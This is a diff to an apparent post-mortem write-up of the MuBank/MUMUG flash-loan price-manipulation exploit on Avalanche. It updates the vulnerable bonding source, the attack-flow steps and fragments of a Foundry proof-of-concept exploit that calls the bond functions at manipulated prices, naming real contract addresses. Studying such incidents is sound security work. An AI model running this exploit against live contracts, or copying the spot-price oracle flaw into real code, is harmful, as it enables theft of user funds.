@@ -78,56 +78,99 @@ contract SafeMUBank {
 
 ### On-Chain Source Code
 
-> ⚠️ Contract not verified on Sourcify — source unavailable. The behavior below is reconstructed from the attack PoC and on-chain traces, not verified source.
->
-> Victim contract: `0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab` (MUBank, Avalanche)
+Source: **Etherscan-verified** (V2 API, chainid 43114) — MuBank `0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab`
 
-The PoC (`MUMUG_exp.sol`) calls `mu_bond(3300e6)` and `mu_gold_bond(6990e6)` inside the `joeCall` flash-loan callback — immediately after swapping borrowed MU tokens for USDC.e, which crashed the MU spot price. This confirms the contract reads the AMM spot price at call time with no TWAP or cooldown protection:
+The real `mu_bond()` signature is `mu_bond(address stable, uint256 amount)` — the stable-coin address is passed as a parameter. The price derives from `_mu_bond_quote()` which reads spot reserves from the MU/USDC.e Trader Joe LP pair (`0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5`) via `Pair.getReserves()` with no TWAP or cooldown.
 
 ```solidity
-// ⚠️ RECONSTRUCTED from PoC — NOT verified source; presented as pseudocode only
-// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/MUMUG_exp.sol
+// ✅ Etherscan-verified source — MuBank 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab (Avalanche)
 
-contract MUBank {
-    IUniswapV2Pair public muMugPair;   // MU/MUG pair on Trader Joe
-    IERC20 public usdce;
-    IERC20 public mugToken;
-
-    // ❌ reads AMM spot price at call time — no TWAP, no cooldown
-    function _getMUSpotPrice() internal view returns (uint256) {
-        (uint112 muReserve, uint112 mugReserve,) = muMugPair.getReserves();
-        // price = mugReserve / muReserve  (manipulable in same tx)
-        return uint256(mugReserve) * 1e18 / uint256(muReserve); // ❌ spot price
+function mu_bond(address stable, uint256 amount) public nonReentrant {
+    require(is_approved_stable_coin(stable) ,"Only accepting approved stable coins for bonding");
+    IERC20 _stable = IERC20(stable);
+    Token token = Token(stable);
+    uint8 _decimals = token.decimals();
+    uint256 _adjusted_amount;
+    if(18 - _decimals == 0)
+        _adjusted_amount = amount;
+    else {
+        _adjusted_amount = (amount/(10**(18-_decimals)));
     }
+    require(_stable.balanceOf(msg.sender) >= _adjusted_amount, "You don't have enough of that token to bond that amount");
+    (uint256 mu_coin_swap_amount, uint256 mu_coin_amount) = _mu_bond_quote(amount); // ❌ reads AMM spot price
+    require(IERC20(_MuCoin).balanceOf(address(this)) >= mu_coin_amount, "This contract does not have enough Mu Coin");
+    _stable.transferFrom(msg.sender, address(this), _adjusted_amount);
+    IERC20(_MuCoin).transfer(msg.sender, mu_coin_amount);
+    MuMoneyMinter(_MuMoney).mint(address(this), amount);    
+}
 
-    function mu_bond(uint256 usdceAmount) external {
-        // ❌ No flash-loan guard — callable inside a joeCall / flash-loan callback
-        usdce.transferFrom(msg.sender, address(this), usdceAmount);
-
-        uint256 muPrice = _getMUSpotPrice(); // ❌ price already manipulated by attacker
-        // After attacker dumps MU → USDC.e, MU reserve is huge, MUG reserve tiny
-        // → muPrice (MUG per MU) is very low → mugAmount is very high
-        uint256 mugAmount = usdceAmount * 1e18 / muPrice; // ❌ over-minted MUG
-
-        mugToken.transfer(msg.sender, mugAmount);
+function mu_gold_bond(address stable, uint256 amount) public nonReentrant{
+    require(is_approved_stable_coin(stable) ,"Only accepting approved stable coins for bonding");
+    
+    IERC20 _stable = IERC20(stable);
+    Token token = Token(stable);
+    uint8 _decimals = token.decimals();
+    uint256 _adjusted_amount;
+    if(18 - _decimals == 0)
+        _adjusted_amount = amount;
+    else {
+        _adjusted_amount = (amount/(10**(18-_decimals)));
     }
+    require(_stable.balanceOf(msg.sender) >= _adjusted_amount, "You don't have enough of that token to bond that amount");
+        (uint256 mu_gold_swap_amount, uint256 mu_gold_bond_amount)  = _get_mug_bond_quote(amount); // ❌ reads AMM spot price
+        require(IERC20(_MuGold).balanceOf(address(this)) >= mu_gold_bond_amount, "This contract does not have enough Mu Coin");
+        _stable.transferFrom(msg.sender, address(this), _adjusted_amount);
+        IERC20(_MuGold).transfer(msg.sender, mu_gold_bond_amount);
+        MuMoneyMinter(_MuMoney).mint(address(this), amount);
 
-    function mu_gold_bond(uint256 usdceAmount) external {
-        // ❌ identical spot-price vulnerability
-        usdce.transferFrom(msg.sender, address(this), usdceAmount);
-        uint256 muPrice = _getMUSpotPrice();                        // ❌
-        uint256 mugAmount = usdceAmount * GOLD_MULTIPLIER / muPrice; // ❌
-        mugToken.transfer(msg.sender, mugAmount);
-    }
+}
+
+// ❌ Price oracle: reads current AMM spot reserves — manipulable in the same transaction
+function _mu_bond_quote(uint256 amount) internal view returns(uint256 swapAmount, uint256 bondAmount){
+    Router router = Router(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
+    //Pair USDC.e/MU token0 is USDC.e (6) token1 is Mu Coin (18)
+    (uint112 reserve0, uint112 reserve1) = Pair(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5).getReserves();//MU/USDC.e TJ LP // ❌ spot reserves
+    reserve0 = reserve0 * (10 ** 12);
+    uint256 amountIN = router.getAmountIn(amount, reserve1, reserve0);
+    uint256 amountOUT = router.getAmountOut(amount, reserve0, reserve1);
+    uint256 mu_coin_bond_amount = (((((amountIN + amountOUT)*10))/2)/10); // ❌ derived from spot price — manipulable via flash loan
+    return (amountOUT, mu_coin_bond_amount);
+}
+
+function _get_mug_bond_quote(uint256 amount) internal view returns (uint256 swapAmount, uint256 bondAmount){
+    Router router = Router(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
+    address muMugPool = 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d;
+    address muPool = 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5;
+    
+    //get swap amount and bond amount of Mu Coin
+    (uint112 reserve0, uint112 reserve1) = Pair(muPool).getReserves();//MU/USDC.e TJ LP // ❌ spot reserves
+    reserve0 = reserve0 * (10 ** 12);
+    uint256 amountIN = router.getAmountIn(amount, reserve1, reserve0);
+    uint256 amountOUT = router.getAmountOut(amount, reserve0, reserve1);
+    uint256 mu_coin_swap_amount = amountOUT;
+    uint256 mu_coin_bond_amount = (((((amountIN + amountOUT)*10))/2)/10);
+
+    //mu/mug pool token0 is mu coin (18) and token1 is mu gold (18)
+    ( reserve0,  reserve1) = Pair(muMugPool).getReserves();//MU/USDC.e TJ LP // ❌ second spot read — also manipulable
+    uint256 mugSwapamountOUT = router.getAmountOut(mu_coin_swap_amount, reserve0, reserve1);
+
+    uint256 mugBondamountIN = router.getAmountIn(mu_coin_bond_amount, reserve1, reserve0);
+    uint256 mugBondamountOUT = router.getAmountOut(mu_coin_bond_amount, reserve0, reserve1);
+    uint256 mu_gold_bond_amount = (((((mugBondamountIN + mugBondamountOUT)*10))/2)/10); // ❌ derived from manipulated reserves
+
+    
+    //return amount of Mu Gold that could be achived via swap vs achived via bonding from the bank
+    return(mugSwapamountOUT, mu_gold_bond_amount);
 }
 ```
 
 **Why it is exploitable (identify the bug from the code):**
 
-- `_getMUSpotPrice()` calls `muMugPair.getReserves()` and computes price from the current reserve ratio. Reserves are changed by any swap, including swaps executed in the same transaction's flash-loan callback.
-- The attacker borrowed almost the entire MU supply from the MU/MUG pair via Trader Joe flash swap, then swapped it all for USDC.e. This drained the MU reserve and inflated USDC.e, crashing the MU→MUG spot price.
-- With MU price near zero, `mugAmount = usdceAmount * 1e18 / muPrice` produces an astronomically large MUG quantity for the same USDC.e input.
-- There is no TWAP window, no per-block cooldown, and no re-entrancy guard preventing bond purchase inside the flash callback.
+- `_mu_bond_quote()` calls `Pair(0xfacB3892...).getReserves()` on the MU/USDC.e LP and computes bond amounts from the current spot reserve ratio. Reserves are changed by any swap, including swaps executed in the same transaction's flash-loan callback.
+- The attacker borrowed almost the entire MU supply from the MU/MUG pair via Trader Joe flash swap, then swapped it all for USDC.e. This drained the MU reserve, crashing the computed MU price.
+- With MU price near zero, `_mu_bond_quote()` returns an astronomically large `mu_coin_bond_amount` for the same USDC.e input, and `_get_mug_bond_quote()` similarly over-quotes MUG.
+- `mu_bond()` has a `nonReentrant` guard but no flash-loan detection — `nonReentrant` only blocks re-entry into the same function, not a call from a flash-loan callback in a different call frame.
+- There is no TWAP window and no per-block cooldown preventing bond purchase inside the flash callback.
 
 ```solidity
 // ✅ Fix: use a TWAP price and block bond purchases in the same block as a large price move
@@ -152,13 +195,13 @@ Attacker
     ├─[2] Swap MU → USDC.e (Joe Router)
     │       Large MU dump → MU price drops (or acquire USDC.e)
     │
-    ├─[3] Call mu_bond(3,300 USDC.e)
-    │       ❌ Over-mint MUG at manipulated / flash-loan-based MU price
-    │       3,300 USDC.e → acquire MUG
+    ├─[3] Call mu_bond(USDC.e, 3,300e18)
+    │       ❌ Over-issue MU Coin at manipulated / flash-loan-based MU price
+    │       3,300 USDC.e (18-dec) → acquire excess MU Coin
     │
-    ├─[4] Call mu_gold_bond(6,990 USDC.e)
+    ├─[4] Call mu_gold_bond(USDC.e, 6,990e18)
     │       ❌ Same vulnerable price reference
-    │       6,990 USDC.e → acquire additional MUG
+    │       6,990 USDC.e (18-dec) → acquire excess MU Gold
     │
     ├─[5] Reverse-swap USDC.e → MU to repay flash loan
     │
@@ -178,8 +221,8 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 
 interface IMUBank {
-    function mu_bond(uint256 amount) external;
-    function mu_gold_bond(uint256 amount) external;
+    function mu_bond(address stable, uint256 amount) external;       // real verified signature
+    function mu_gold_bond(address stable, uint256 amount) external;  // real verified signature
 }
 
 interface IRouter {
@@ -231,12 +274,12 @@ contract MUMUGExploit is Test {
         );
 
         // [Step 3] Purchase mu_bond
-        // ⚡ Over-receive MUG due to flash-loan-based price manipulation
+        // ⚡ Over-receive MU Coin due to flash-loan-based price manipulation
         USDCe.approve(address(muBank), type(uint256).max);
-        muBank.mu_bond(3_300 * 1e6);
+        muBank.mu_bond(address(USDCe), 3_300 * 1e18); // real signature: mu_bond(address stable, uint256 amount)
 
         // [Step 4] Purchase mu_gold_bond
-        muBank.mu_gold_bond(6_990 * 1e6);
+        muBank.mu_gold_bond(address(USDCe), 6_990 * 1e18); // real signature: mu_gold_bond(address stable, uint256 amount)
 
         // [Step 5] Reverse-swap USDC.e → MU to fund flash loan repayment
         path[0] = address(USDCe); path[1] = address(MU);
@@ -247,7 +290,7 @@ contract MUMUGExploit is Test {
         // Repay flash loan
         MU.transfer(address(pair), muAmount);
 
-        // [Step 6] Sell MUG → USDC.e
+        // [Step 6] Sell MU Gold → USDC.e (profit from over-issued MUG tokens)
         MUG.approve(address(router), type(uint256).max);
         path[0] = address(MUG); path[1] = address(USDCe);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
